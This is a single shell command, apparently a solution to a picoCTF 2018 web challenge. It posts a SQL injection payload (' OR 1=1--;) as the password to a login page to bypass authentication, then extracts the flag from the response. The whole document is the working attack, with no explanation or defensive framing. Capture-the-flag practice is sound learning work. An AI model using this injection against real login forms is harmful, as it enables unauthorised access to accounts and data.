curl -s http://2018shell.picoctf.com:52012/login.php -d "username=admin&password=' OR 1=1--;" | grep 'picoCTF{.*}' -o --colour=never
